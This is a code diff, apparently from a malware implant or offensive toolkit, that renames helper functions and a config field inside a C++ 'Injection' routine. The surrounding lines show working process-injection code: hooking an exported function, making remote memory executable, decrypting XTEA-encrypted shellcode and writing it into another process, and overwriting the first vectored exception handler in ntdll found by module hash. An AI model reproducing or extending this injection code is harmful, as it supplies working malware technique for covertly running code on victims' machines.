@@ -1,4 +1,4 @@
-#include <include/inject.hpp>
+#include <core/include/inject.hpp>
 #define CALL_X_OFFSET 0x1
 #define EXPORT_OFFSET 0x12
 
@@ -21,9 +21,9 @@ namespace Injection {
         hook_p      = hook;
         loader_rva  = hook - (ex_addr + 5);
 
-        x_memcpy(&ex_addr_p, &ex_addr, sizeof(void*));
-        x_memcpy(B_PTR(writer.loader)+EXPORT_OFFSET, &ex_addr_p, sizeof(void*));
-        x_memcpy(B_PTR(writer.opcode)+CALL_X_OFFSET, &loader_rva, 4);
+        MemCopy(&ex_addr_p, &ex_addr, sizeof(void*));
+        MemCopy(B_PTR(writer.loader)+EXPORT_OFFSET, &ex_addr_p, sizeof(void*));
+        MemCopy(B_PTR(writer.opcode)+CALL_X_OFFSET, &loader_rva, 4);
 
         x_ntassert(Ctx->nt.NtProtectVirtualMemory(process, (void**) &ex_addr_p, &total, PAGE_EXECUTE_READWRITE, nullptr));
         x_ntassert(Ctx->nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), (void*) writer.opcode->data, 0x5, &write));
@@ -34,7 +34,7 @@ namespace Injection {
         x_assert(write != writer.loader->length);
 
         if (ENCRYPTED) {
-            Xtea::XteaCrypt(B_PTR(shellcode), n_shellcode, Ctx->config.key, FALSE);
+            Xtea::XteaCrypt(B_PTR(shellcode), n_shellcode, Ctx->config.session_key, FALSE);
         }
 
         x_ntassert(Ctx->nt.NtWriteVirtualMemory(process, RVA(PBYTE, hook, writer.loader->length), shellcode, n_shellcode, &write));
@@ -84,7 +84,7 @@ namespace Injection {
 
         NTSTATUS OverwriteFirstHandler(_veh_writer const &writer) {
 
-            const auto mod_hash = Utils::HashStringW(writer.mod_name, x_wcslen(writer.mod_name));
+            const auto mod_hash = Utils::HashStringW(writer.mod_name, WcsLength(writer.mod_name));
             const auto ntdll    = Memory::Modules::GetModuleEntry(mod_hash);
 
             const auto entry    = GetFirstHandler(ntdll, writer.signature, writer.mask);
